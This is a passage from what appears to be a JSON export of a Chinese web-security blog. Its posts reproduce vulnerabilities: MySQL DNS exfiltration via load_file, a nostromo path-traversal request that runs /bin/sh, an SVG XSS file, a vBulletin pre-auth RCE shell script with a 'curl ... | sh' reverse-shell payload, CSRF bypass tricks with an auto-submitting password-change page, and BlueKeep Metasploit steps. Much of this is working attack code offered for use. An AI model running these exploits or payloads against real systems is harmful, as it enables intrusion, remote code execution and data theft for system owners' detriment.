这里构造下payload读取：C:\\phpStudy\\WWW\\phpinfo.php 12345678910111213首先select hex(&apos;C:\\\\phpStudy\\\\WWW\\\\phpinfo.php&apos;)得到加密字符串:433A5C70687053747564795C5757575C706870696E666F2E706870然后构造下payload:select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //这里用了两个load_file就解决上面所说的问题了。但是你觉得会成功吗 no no no因为文件带有换行符这是不符合 域名规范的 那么我们怎么办呢 加密数据咯用hex() 继续构造payload:select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263)); 复现如下图： 0X04 Reference- 参考链接： https://xz.aliyun.com/t/3992#toc-1 https://www.freebuf.com/articles/web/201013.html https://www.t00ls.net/thread-44273-1-1.html","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"nostromo nhttpd 路径遍历漏洞","slug":"CVE-2019-16278","date":"2019-10-17T07:30:08.000Z","updated":"2019-10-17T07:32:00.814Z","comments":true,"path":"2019/10/17/CVE-2019-16278/","link":"","permalink":"http://www.vkxss.top/2019/10/17/CVE-2019-16278/","excerpt":"","text":"0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞描述 0X05 漏洞POC 0X06 漏洞复现 0X07 修复建议 0X08 Reference 0X00 简介 nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X01 CVE编号 CVE-2019-16278 0X02 漏洞威胁等级 高危 0X03 影响范围 nostromo nhttpd &lt;= 1.9.6 0X04 漏洞描述 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X05 漏洞POC CVE-2019-16278.sh 12345678POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0Connection: closeUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Content-Length: 25 echo echo ifconfig 2&gt;&amp;1 0X06 漏洞复现 记录一下，请参考： https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278 0X07 修复建议 上waf或防火墙配置规则拦截,等待官方修复打补丁。 0X08 Reference 参考链接： http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807 https://git.sp0re.sh/sp0re/Nhttpd-exploits","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16278","slug":"CVE-2019-16278","permalink":"http://www.vkxss.top/tags/CVE-2019-16278/"}]},{"title":"接口快速测试小技巧(Python)","slug":"Python-接口快速测试小技巧(Python)","date":"2019-10-13T07:30:08.000Z","updated":"2020-03-22T16:37:16.124Z","comments":true,"path":"2019/10/13/Python-接口快速测试小技巧(Python)/","link":"","permalink":"http://www.vkxss.top/2019/10/13/Python-接口快速测试小技巧(Python)/","excerpt":"","text":"接口快速测试小技巧(Python) 终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺 网站：https://curl.trillworks.com","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"SVG-XSS","slug":"渗透测试-SVG-XSS","date":"2019-10-11T07:30:08.000Z","updated":"2019-10-11T10:38:58.307Z","comments":true,"path":"2019/10/11/渗透测试-SVG-XSS/","link":"","permalink":"http://www.vkxss.top/2019/10/11/渗透测试-SVG-XSS/","excerpt":"","text":"SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"CVE-2019-13272-Linux本地提权漏洞","slug":"CVE-2019-13272","date":"2019-10-08T07:30:08.000Z","updated":"2019-10-09T08:00:57.618Z","comments":true,"path":"2019/10/08/CVE-2019-13272/","link":"","permalink":"http://www.vkxss.top/2019/10/08/CVE-2019-13272/","excerpt":"","text":"漏洞概述： 影响范围 复现环境 漏洞复现 漏洞概述： 当调用PTRACE_TRACEME时，ptrace_link函数将获得对父进程凭据的RCU引用，然后将该指针指向get_cred函数。但是，对象struct cred的生存周期规则不允许无条件地将RCU引用转换为稳定引用。 PTRACE_TRACEME获取父进程的凭证，使其能够像父进程一样执行父进程能够执行的各种操作。如果恶意低权限子进程使用PTRACE_TRACEME并且该子进程的父进程具有高权限，该子进程可获取其父进程的控制权并且使用其父进程的权限调用execve函数创建一个新的高权限进程。攻击者最终控制具有高权限的两个进程ptrace关系，可以被用来ptrace，suid二进制文件并获得root权限。 影响范围 目前受影响的Linux内核版本： Linux Kernel &lt; 5.1.17 复现环境 exploit下载地址： https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272 Ubuntu 4.13.0-38-generic Kali未复现成功，普通用户执行gcc，提示权限不够 漏洞复现 利用效果如下图:","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"Linux本地提取","slug":"Linux本地提取","permalink":"http://www.vkxss.top/tags/Linux本地提取/"}]},{"title":"vBulletin 5.x 前台远程代码执行漏洞复现","slug":"CVE-2019-16759","date":"2019-09-25T07:30:08.000Z","updated":"2019-09-25T16:45:55.068Z","comments":true,"path":"2019/09/25/CVE-2019-16759/","link":"","permalink":"http://www.vkxss.top/2019/09/25/CVE-2019-16759/","excerpt":"","text":"0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞描述 0X05 漏洞POC 0X06 漏洞复现 0X07 修复建议 0X08 Reference 0X00 简介 vBulletin 是一个商用的论坛程序，在全球拥有数万用户且增长速度很快。该论坛采用PHP Web语言及MySQL数据库的方式进行架构。《财富》 500强和Alexa排名前100万的公司网站大部分都在使用的一款互联网论坛程序。 0X01 CVE编号 CVE-2019-16759 相关信息链接：https://seclists.org/fulldisclosure/2019/Sep/31 0X02 漏洞威胁等级 高危 0X03 影响范围 CVE-2019-16759漏洞影响：vBulletin 5.0.0 到最新 5.5.4版本 0X04 漏洞描述 漏洞通过请求ajax/render/widget_php进行模板注入触发代码执行。 0X05 漏洞POC12345678910111213141516171819202122232425262728293031#!/usr/bin/python## vBulletin 5.x 0day pre-auth RCE exploit# # This should work on all versions from 5.0.0 till 5.5.4## Google Dorks:# - site:*.vbulletin.net# - &quot;Powered by vBulletin Version 5.5.4&quot;import requestsimport sysif len(sys.argv) != 2: sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;while True: try: cmd = raw_input(&quot;vBulletin$ &quot;) params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&apos;&quot;+cmd+&quot;&apos;); exit;&quot; r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(&quot;Exploit failed! :(&quot;) except KeyboardInterrupt: sys.exit(&quot;\\nClosing shell...&quot;) except Exception, e: sys.exit(str(e)) 0X06 漏洞复现 漏洞地址： 访问漏洞URL，修改请求方式为POST： 然后在post参数中可输入以下任意payload验证： payload1：widgetConfig[code] = echo shell_exec(‘id’); payload2：widgetConfig[code] = echo shell_exec(‘whoami’); payload3：widgetConfig[code] = echo shell_exec(‘uname-a’); payload4：widgetConfig[code] = echo shell_exec(‘curl https://shell.now.sh/yourip:1337 | sh’); 注意使用payload4反弹shell，参考如下： Reverse Shell as a Service https://github.com/lukechilds/reverse-shell 在你的机器：nc -l 1337 在目标机器上：curl https://shell.now.sh/yourip:1337 | sh 反弹Shell会话 0X07 修复建议 上waf或防火墙配置规则拦截,等待官方修复打补丁。 0X08 Reference 参考链接：https://www.youtube.com/watch?v=ymLRqsbCuVY","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16759","slug":"CVE-2019-16759","permalink":"http://www.vkxss.top/tags/CVE-2019-16759/"}]},{"title":"绕过CSRF防御总结","slug":"渗透测试-绕过CSRF防御总结","date":"2019-09-19T07:30:08.000Z","updated":"2020-03-29T05:01:26.241Z","comments":true,"path":"2019/09/19/渗透测试-绕过CSRF防御总结/","link":"","permalink":"http://www.vkxss.top/2019/09/19/渗透测试-绕过CSRF防御总结/","excerpt":"","text":"一、 先了解下CSRF_TOKEN 1. 什么是CSRF_TOKEN 2. 为什么CSRF-Token可以写在COOKIE里 3. 常见csrf_token使用方式有两种： 3.1 Synchronizer token pattern(STP) 3.2 Cookie-to-header token 二、绕过CSRF防御总结 2.1 所有的CSRF 2.1.1 点击劫持 2.1.2 更改请求方法 三 、CSRF token的防御措施 3.1 删除token参数或发送空token 3.2 令牌共享 3.3 Session固定 3.4 窃取token 3.5 Jsonp劫持获取csrf_token 3.6 解码CSRF令牌 3.6 修改请求方法 四、 Referer字段的CSRF防御 4.1 Referer值为空或移除referer字段 4.2 自建服务器路径带referer字段名 4.3 利用URL跳转 4.3 绕过正则表达式 五、CSRF_POC 一、 先了解下CSRF_TOKEN1. 什么是CSRF_TOKEN 就是防止跨站请求伪造（CSRF）的 2. 为什么CSRF-Token可以写在COOKIE里 将csrf令牌写入Cookie，是因为：服务器进行csrf防御校验的时候，是拿用户http请求体中的token参数值和cookie中的csrftoken值进行比对。如果值一样了，操作才被允许执行。 因为同源策略的限制，当正常用户通过账号密码等方式登陆网站A后，在不注销账号或当前COOKIE失效之前，再次访问网站A时（协议、IP、端口号相同则属于同源）浏览器会自动在HTTP请求包中带上该网站用户登陆后的COOKIE信息。这也就是为什么同源策略无法防御csrf的原因。 也就是说我们对CSRF的理解应为：攻击者借用用户COOKIE执行非用户本意的操作。 在此攻击过程中用户COOKIE对于攻击者来说是不可见的是未知的、不可见的，攻击者能做到仅仅是借用COOKIE，而COOKIE里面具体写了什么，攻击者是不知道的。又因为COOKIE里的信息对于攻击者来说是不可预知的，无法伪造的，所以将CSRF-TOKEN写在COOKIE中符合就CSRF防御思想中的不可预知原则。 3. 常见csrf_token使用方式有两种：3.1 Synchronizer token pattern(STP) 对于每个request，在服务器端生成一个新的csrf_token，并将其返回在页面的表单中。在服务器端每次接收到请求时，都会验证表单中是否包含正确的csrf_token。由于第三方网站无法得知正确的csrf_token，所以无法进行csrf攻击。 1234567get_token = get_random_token() return &#123; &lt;form&gt; &lt;input name=field1&gt;&lt;/input&gt; &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=#&#123;get_token()&#125; /&gt; &lt;/form&gt;&#125; 这个方法的好处是客户端不需要支持javascript，因此通用于所有的网站。坏处是由于服务器端对于每个请求都会更换csrf_token，因此他需要保证用户提交的表单是用户最近一次请求的表单。如果用户通过多个tab同时浏览该网站，那么往往会导致用户提交的表单不是最新的那一个。 3.2 Cookie-to-header token 第二个方法是为每个session生成一个csrf_token，随后将csrf_token保存到cookie中，之后通过javascript在每次请求时将csrf_token设置到http header中的X-Csrf-Token属性中。再在服务器端比较Cookie的csrf_token与header中的token是否一致。 12345//当用户登录时设置CookieSet-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=///当用户发送请求时设置Http Header中的X-Csrf-TokenX-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql 二、绕过CSRF防御总结 注：原文链接：https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee（需要科学上网） CSRF漏洞很容易就可以被发现并利用。一眼看去很多站点好像在这方面都做得不错：当你检查针对敏感操作的请求时，他们往往会实施CSRF保护。有时候可能是一个在请求主体中的CSRF token，也有可能是一个referer字段检测，或者有时是一个特殊的HTTP头字段或者cookie字段。 但是CSRF的防御不代表它就不可以被绕过。今天我们讨论一些我如何绕过CSRF防御措施的技术。 2.1 所有的CSRF 不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。 2.1.1 点击劫持 在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。 2.1.2 更改请求方法 另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。 例如，如下请求： 123456POST /change_passwordPOST body:new_password=qwerty可以被改写成GET /change_password?new_password=qwerty 三 、CSRF token的防御措施 因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。 3.1 删除token参数或发送空token 不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。 例如，合法请求如下 12345678910111213POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b那么实施这种请求：POST /change_passwordPOST body:new_password=qwerty或这种：POST /change_passwordPOST body:new_password=qwerty&amp;csrf_tok= 3.2 令牌共享 应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。 如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。 换句话说，原本应该发送如下请求： 12345678POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b但是改成发送这个请求：POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=YOUR_TOKEN 3.3 Session固定 有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。 如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。 这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。 session固定。这是一个可以让你控制受害者的cookie存储的攻击； 123456执行如下请求来实施CSRF攻击POST /change_passwordCookie: CSRF_TOK=FAKE_TOKEN;POST body:new_password=qwerty &amp;csrf_tok=FAKE_TOKEN 3.4 窃取token 配合XSS，前提是网站不存在XSS漏洞或者CSRF-Token具备httponly属性 重定向、web缓存欺骗、clickjacking等都可能导致token泄露 3.5 Jsonp劫持获取csrf_token https://www.jianshu.com/p/1cda296cf7d2 3.6 解码CSRF令牌 尝试进行MD5或Base64编码 3.6 修改请求方法 post改为get 四、 Referer字段的CSRF防御 如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？ 4.1 Referer值为空或移除referer字段 首先，我们对空Referer的定义为，Referer 头部的内容为空，或者，一个HTTP请求中根本不包含Referer头部 和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。 扩展测试面：例如jsonp劫持 123&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;或&lt;meta name =&quot;referrer&quot; content =&quot;no-referrer&quot;&gt; 应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。 4.2 自建服务器路径带referer字段名 原理就是在路径上创建成原本referer中有的字段名，如果校验只是判断是否包含。 案例： https://www.zybuluo.com/1kbfree/note/1210937 4.3 利用URL跳转 案例： https://www.zybuluo.com/1kbfree/note/1239095 4.3 绕过正则表达式 如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。 如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。 五、CSRF_POC 恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。 12345678910111213141516171819202122232425262728&lt;html&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; function post(url,fields) &#123; var p = document.createElement(&quot;form&quot;); p.action = url; p.innerHTML = fields; p.target = &quot;_self&quot;; p.method = &quot;post&quot;; document.body.appendChild(p); p.submit(); &#125; function csrf_hack() &#123; var fields; fields += &quot;&lt;input type=&apos;hidden&apos; name=&apos;user_id&apos; value=&apos;1&apos; /&gt;&quot;; fields += &quot;&lt;input type=&apos;hidden&apos; name=&apos;newpassword&apos; value=&apos;123456&apos; /&gt;&quot;; fields += &quot;&lt;input type=&apos;hidden&apos; name=&apos;password&apos; value=&apos;123456&apos; /&gt;&quot;; var url = &quot;漏洞URL+&amp;submit=提交&quot;; post(url,fields); &#125; window.onload = function() &#123; csrf_hack();&#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"前端安全-CSRF","slug":"前端安全-CSRF","permalink":"http://www.vkxss.top/tags/前端安全-CSRF/"}]},{"title":"路径遍历的RCE","slug":"渗透测试-路径遍历的RCE","date":"2019-09-10T07:30:08.000Z","updated":"2019-11-12T08:04:54.794Z","comments":true,"path":"2019/09/10/渗透测试-路径遍历的RCE/","link":"","permalink":"http://www.vkxss.top/2019/09/10/渗透测试-路径遍历的RCE/","excerpt":"","text":"0x00 路径遍历的RCE 0x00 路径遍历的RCE 如下是利用目录遍历，配合文件上传漏洞的一个RCE的记录。 条件： 存在目录遍历漏洞 存在文件上传漏洞 已知上传的路径，无访问权限的情况 首先，在浏览时，我发现一个引起我注意的参数，frameManagerPath是base64参数。此路径始终返回javascript代码。就像下面的图像： 解码该值后，我可以注意到该值是文件的相对路径。 接下来，步骤是将字符串/ etc / passwd编码为base64格式，以尝试遍历某些路径，令我惊讶的是:)。OBS：L2V0Yy9wYXNzd2Q = == / etc / passwd 但是，在找到该路径遍历之前，我发现了一个上传错误的文件，使我能够上传 任何类型的文件，但是我无法访问/ wwwroot / path：/中的根目录。下图显示了此文件上传的请求和响应。 下一步，我将显示一个Webshel​​l，如下所示。 通过将这两个项目结合在一起，可以通过路径遍历访问webshel​​l，并通过webshel​​l在服务器上执行命令。cmFudC9ibG9nL3BhdGh0cmF2ZXJzYWwvaW1hZ2UwNS5wbmc = ==“路径wwwroot编码为em base64（模糊）” 请求 响应 下一个图像说明了最终结果。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"CVE-2019-0708 远程桌面代码执行漏洞复现","slug":"CVE-2019-0708","date":"2019-09-07T07:30:08.000Z","updated":"2019-09-20T02:01:32.249Z","comments":true,"path":"2019/09/07/CVE-2019-0708/","link":"","permalink":"http://www.vkxss.top/2019/09/07/CVE-2019-0708/","excerpt":"","text":"0X00 简介 0X01 环境准备 0x02 漏洞复现 0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具 0X00 简介 Microsoft Windows是美国微软公司发布的视窗操作系统。远程桌面连接是微软从Windows 2000 Server开始提供的功能组件。 2019年5月14日，微软发布了月度安全更新补丁，修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标 Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。 近日，Metasploit发布了该漏洞的利用模块，GitHub网站上也公开了该漏洞的利用代码，引起了安全研究人员的广泛关注。目前该漏洞利用仅对Windows 7 SP1 x64与Windows 2008 R2 x64（非系统默认配置）系统版本有效，在虚拟机环境下复现成功。 0X01 环境准备 攻击机:kali 靶机：Win7 12Windows7 SP1下载链接ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 0x02 漏洞复现 msf必须使用msf5（#msfupdate） 下载exp:kali攻击机下载metasploit攻击脚本，kali中执行以下命令 1234wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 图：下载攻击载荷 做如下替换（大部分人msf都装在如下位置） 12345678rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 做如下替换（我的位置） 12345678rdp.rb -&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb reload_all 重新加载所有的模块，将新添加的模块加载上。成功如下图： 图：成功加载攻击载荷 使用攻击载荷 1234&gt; use exploit/rdp/cve_2019_0708_bluekeep_rce&gt; set rhosts 靶机IP&gt; set target 3 （根据靶机而定）&gt; exploit 成功利用！！！！ 1&gt; set target 3 图：蓝屏 再来一次！！！！ 1&gt; set target 1 图：会话 0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具 下载页面： 1https://www.qianxin.com/other/CVE-2019-0708 使用说明： 12345&gt;下载文件进行解压。&gt;使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。&gt;在命令行工具，执行命令到工具所在文件夹&gt;输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。&gt;重启系统后，需要重新运行命令行来启用热补丁 实现效果： 123456789101112131415在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：https://www.qianxin.com/other/CVE-2019-0708支持系统：Windows XP for 32-bit Systems Service Pack 3Windows 7 for 32-bit SystemsWindows 7 for x64-based SystemsWindows 7 for 32-bit Systems Service Pack 1Windows 7 for x64-based Systems Service Pack 1Windows Server 2003 for 32-bit Systems Service Pack 2Windows Server 2003 R2 for 32-bit Systems Service Pack2Windows Server 2008 for 32-bit Systems Service Pack 2Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)Windows Server 2008 for x64-based Systems Service Pack2Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)Windows Server 2008 R2 for x64-based Systems ServicePack 1Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation) 暂不支持的系统： 123Windows Server 2003 for x64-based Systems Service Pack2Windows Server 2008 for Itanium-Based Systems ServicePack 2Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-0708","slug":"CVE-2019-0708","permalink":"http://www.vkxss.top/tags/CVE-2019-0708/"}]},{"title":"Insecure Randomness","slug":"代码审计-Insecure Randomness","date":"2019-08-22T06:10:40.000Z","updated":"2019-11-19T06:38:29.828Z","comments":true,"path":"2019/08/22/代码审计-Insecure Randomness/","link":"","permalink":"http://www.vkxss.top/2019/08/22/代码审计-Insecure Randomness/","excerpt":"","text":"1、Insecure Randomness 1.1、描述： 1.2、审计方法： 1.3、漏洞示例: 1.4、漏洞危害： 1.5、修复方案： 1、Insecure Randomness1.1、描述： 伪随机数生成器（PRNG）使用确定性数学算法来产生具有良好统计属性的数字序列。但是这种数字序列并不具有真正的随机特性。伪随机数生成器通常以一个算术种子值为起始。算法使用该种子值生成一个输出以及一个新的种子，这个种子又被用来生成下一个随机值，以此类推。Java API 提供了伪随机数生成器（PRNG）—— java.util.Random类。这个伪随机数生成器具有可移植性和可重复性。因此，如果两个java.util.Random类的实例创建时使用的是相同的种子值，那么对于所有的Java实现，它们将生成相同的数字序列。在系统重启或应用程序初始化时，Seed值总是被重复使用。在一些其他情况下，seed值来自系统时钟的当前时间。攻击者可以在系统的一些安全脆弱点上监听，并构建相应的查询表预测将要使用的seed值。 1.2、审计方法： 全局搜索以下关键词 “random” 1.3、漏洞示例: 例如在易于猜测的密码、可预测的加密密钥、验证码生成、抽奖活动、UUID生成、SessionID生成、Token生成、CSRF Token、找回密码Token、游戏（随机元素的生成）、密码应用场景、生成密钥：对称密码，消息认证、生成密钥对：公钥密码，数字签名、生成IV： 用于分组密码的CBC，CFB和OFB模式、生成nonce: 用于防御重放攻击; 分组密码的CTR模式、生成盐：用于基于口令的密码PBE等，可能会降低系统安全性。 图1：漏洞代码 1.4、漏洞危害： 生成的随机数很容易预测，可能会降低系统安全性。 1.5、修复方案： 因此，java.util.Random类不能用于安全敏感应用或者敏感数据保护。应使用更加安全的随机数生成器，例如java.security.SecureRandom类。 图2：修复代码","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"Null Dereference","slug":"代码审计-Java-Null Dereference","date":"2019-08-20T07:23:43.000Z","updated":"2019-11-19T06:38:38.248Z","comments":true,"path":"2019/08/20/代码审计-Java-Null Dereference/","link":"","permalink":"http://www.vkxss.top/2019/08/20/代码审计-Java-Null Dereference/","excerpt":"","text":"1、Null Dereference（空指针异常） 1.1、产生原因： 2.2、修复方案： 1、Null 